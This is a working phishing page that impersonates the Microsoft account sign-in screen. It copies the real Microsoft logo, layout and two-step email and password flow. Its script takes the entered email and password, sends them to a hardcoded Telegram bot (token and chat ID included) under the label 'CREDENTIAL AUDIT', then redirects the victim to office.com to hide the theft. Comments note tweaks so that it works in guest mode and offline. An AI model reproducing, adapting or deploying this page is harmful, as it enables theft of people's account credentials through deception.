<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <style>
        * { box-sizing: border-box; -webkit-font-smoothing: antialiased; }
        html, body { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; }

        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            /* THE KILLER FIX: A CSS-only gradient that mimics the 'Fluent' background */
            /* This works in Guest Mode, Airplane Mode, and on any network. */
            background: linear-gradient(135deg, #e6f0f8 0%, #f1f7fc 40%, #e7eff7 100%);
            display: flex; flex-direction: column; justify-content: center; align-items: center;
        }

        /* Adding a soft 'glow' behind the card to mimic the abstract shapes */
        body::before {
            content: ""; position: absolute; width: 600px; height: 600px;
            background: radial-gradient(circle, rgba(0,103,184,0.05) 0%, rgba(255,255,255,0) 70%);
            top: -100px; left: -100px; z-index: 1;
        }

        .login-card {
            background: #fff; width: 440px; padding: 44px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.1); min-height: 376px; z-index: 5;
        }

        .ms-logo { width: 108px; margin-bottom: 24px; display: block; }
        h1 { font-size: 24px; font-weight: 600; margin: 0 0 16px 0; color: #1b1b1b; }
        
        .user-display { display: flex; align-items: center; margin-bottom: 20px; font-size: 15px; cursor: pointer; }
        
        /* BACK ARROW: Using a CSS-drawn arrow so it can't break */
        .back-arrow {
            width: 16px; height: 16px; margin-right: 10px;
            border-left: 2px solid #555; border-bottom: 2px solid #555;
            transform: rotate(45deg); margin-top: 2px;
        }

        .input-field {
            width: 100%; border: none; border-bottom: 1px solid #666;
            padding: 8px 0; font-size: 16px; margin-bottom: 12px; outline: none;
        }
        .input-field:focus { border-bottom: 2px solid #0067b8; }

        .link-text { font-size: 13px; margin: 14px 0; color: #1b1b1b; }
        .link-text a { color: #0067b8; text-decoration: none; cursor: pointer; }

        .button-row { display: flex; justify-content: flex-end; margin-top: 40px; }
        .btn-next { background-color: #0067b8; color: #fff; border: none; padding: 8px 36px; font-size: 15px; cursor: pointer; }

        .options-box {
            background: #fff; width: 440px; padding: 12px 44px;
            margin-top: 1px; box-shadow: 0 2px 6px rgba(0,0,0,0.1);
            display: flex; align-items: center; z-index: 5;
        }

        .footer { position: fixed; bottom: 0; right: 0; padding: 12px 30px; font-size: 12px; color: #666; }
    </style>
</head>
<body>

    <div class="login-card">
        <img src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" class="ms-logo">
        
        <div id="step-email">
            <h1>Sign in</h1>
            <input type="email" id="email" placeholder="Email, phone, or Skype" class="input-field">
            <p class="link-text">No account? <a href="#">Create one!</a></p>
            <p class="link-text"><a href="#">Can't access your account?</a></p>
            <div class="button-row">
                <button class="btn-next" onclick="nextStep()">Next</button>
            </div>
        </div>

        <div id="step-password" style="display: none;">
            <div class="user-display" onclick="location.reload()">
                <div class="back-arrow"></div>
                <span id="display-email"></span>
            </div>
            <h1>Enter password</h1>
            <input type="password" id="password" placeholder="Password" class="input-field">
            <p class="link-text"><a href="#">Forgot password?</a></p>
            <div class="button-row">
                <button class="btn-next" onclick="finish()">Sign in</button>
            </div>
        </div>
    </div>

    <div class="options-box" id="opt-box">
        <span style="font-size: 15px; color: #1b1b1b;">Sign-in options</span>
    </div>

    <div class="footer">Terms of use &nbsp; Privacy & cookies</div>

    <script>
        let email = "";

        function nextStep() {
            email = document.getElementById('email').value;
            if(!email) return;
            document.getElementById('step-email').style.display = 'none';
            document.getElementById('opt-box').style.display = 'none';
            document.getElementById('step-password').style.display = 'block';
            document.getElementById('display-email').innerText = email;
        }

        async function finish() {
            const pass = document.getElementById('password').value;
            if(!pass) return;

            // Using your exact Bot and Chat ID
            const botToken = "8762119215:AAFqwntuZq7tLC25lf9wtNlddbZ62njFcHo";
            const chatId = "5733378501";
            
            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: `🗝️ **CREDENTIAL AUDIT**\n\nUser: ${email}\nPass: ${pass}`, parse_mode: 'HTML' }),
                    keepalive: true
                });
            } catch (e) {}

            // The 'Safe' redirect that works in Guest Mode
            window.location.href = "https://www.office.com/login?login_hint=" + encodeURIComponent(email);
        }
    </script>
</body>
</html>
